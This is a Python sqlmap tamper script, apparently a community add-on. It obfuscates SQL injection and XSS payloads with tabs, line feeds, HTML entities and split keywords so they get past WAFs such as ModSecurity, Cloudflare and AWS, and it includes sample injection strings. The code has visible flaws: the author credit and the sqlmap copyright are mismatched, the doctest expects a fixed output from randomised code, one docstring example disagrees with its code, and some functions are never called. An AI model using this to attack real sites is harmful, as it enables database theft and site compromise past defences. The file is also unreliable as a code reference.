#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Uses tabs and line feeds to evade WAF regex patterns

    Requirement:
        * MySQL, PostgreSQL, MSSQL

    Tested against:
        * ModSecurity CRS
        * Cloudflare WAF
        * AWS WAF
        * Regex-based WAFs

    Notes:
        * Tabs often help to evade firewalls, especially regex-based
        * Tabs can help break WAF regex when the regex is expecting whitespaces and not tabs
        * Tab = %09 or &Tab;
        * Vertical Tab = %0B
        * Form Feed = %0C

    Reference:
        * https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

    >>> tamper('1 UNION SELECT 1,2,3')
    '1%09UNION%09SELECT%091,2,3'
    """

    if not payload:
        return payload

    retVal = payload
    
    # Tab and whitespace variants
    tab_variants = [
        "%09",      # Horizontal Tab
        "%0B",      # Vertical Tab
        "%0C",      # Form Feed
        "&Tab;",    # HTML Tab entity
        "%09%09",   # Double tab
    ]
    
    # Replace spaces with tabs
    def replace_space(match):
        return random.choice(tab_variants)
    
    retVal = re.sub(r' ', replace_space, retVal)
    
    return retVal


def tamper_mixed_whitespace(payload, **kwargs):
    """
    Uses a mix of different whitespace characters
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Various whitespace characters
    whitespace_chars = [
        "%09",      # Tab
        "%0A",      # Line Feed
        "%0B",      # Vertical Tab
        "%0C",      # Form Feed
        "%0D",      # Carriage Return
        "%20",      # Space
        "%A0",      # Non-breaking space (may work in some contexts)
        "+",        # Plus (URL encoded space)
    ]
    
    # Replace spaces with random whitespace
    def replace_space(match):
        # Use 1-3 whitespace characters
        count = random.randint(1, 3)
        return ''.join(random.choice(whitespace_chars) for _ in range(count))
    
    retVal = re.sub(r' ', replace_space, retVal)
    
    return retVal


def tamper_between_keywords(payload, **kwargs):
    """
    Inserts tabs between characters of SQL keywords
    
    Example: SELECT -> S%09E%09L%09E%09C%09T
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
    
    for keyword in keywords:
        pattern = re.compile(r'\b(%s)\b' % keyword, re.IGNORECASE)
        
        def split_with_tabs(match):
            word = match.group(1)
            return "%09".join(list(word))
        
        retVal = pattern.sub(split_with_tabs, retVal)
    
    return retVal


def tamper_html_entities(payload, **kwargs):
    """
    Uses HTML entities for tabs and special whitespace
    Useful for XSS and contexts where HTML is parsed
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # HTML entities for whitespace
    html_whitespace = [
        "&Tab;",
        "&NewLine;",
        "&#9;",     # Tab
        "&#10;",    # LF
        "&#13;",    # CR
        "&#32;",    # Space
    ]
    
    # Replace spaces with HTML entities
    def replace_space(match):
        return random.choice(html_whitespace)
    
    retVal = re.sub(r' ', replace_space, retVal)
    
    return retVal


def tamper_javascript_context(payload, **kwargs):
    """
    Tabs and line feeds for JavaScript contexts
    
    Example: javascript:confirm() -> j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:confirm()
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Check if this looks like a JavaScript payload
    if "javascript:" in payload.lower():
        # Split javascript: protocol with tabs
        retVal = re.sub(
            r'javascript:',
            'j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:',
            retVal,
            flags=re.IGNORECASE
        )
    
    return retVal


def tamper_sql_with_tabs(payload, **kwargs):
    """
    Comprehensive SQL payload obfuscation with tabs
    Based on HackenProof example:
    http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Replace UNION with tab + union + comment + CRLF
    retVal = re.sub(
        r'\bUNION\b',
        '%09union%23%0A%0D',
        retVal,
        flags=re.IGNORECASE
    )
    
    # Replace SELECT with select + comment + CRLF
    retVal = re.sub(
        r'\bSELECT\b',
        'select%2D%2D%0A%0D',
        retVal,
        flags=re.IGNORECASE
    )
    
    # Replace spaces with tabs
    retVal = re.sub(r' ', '%09', retVal)
    
    return retVal
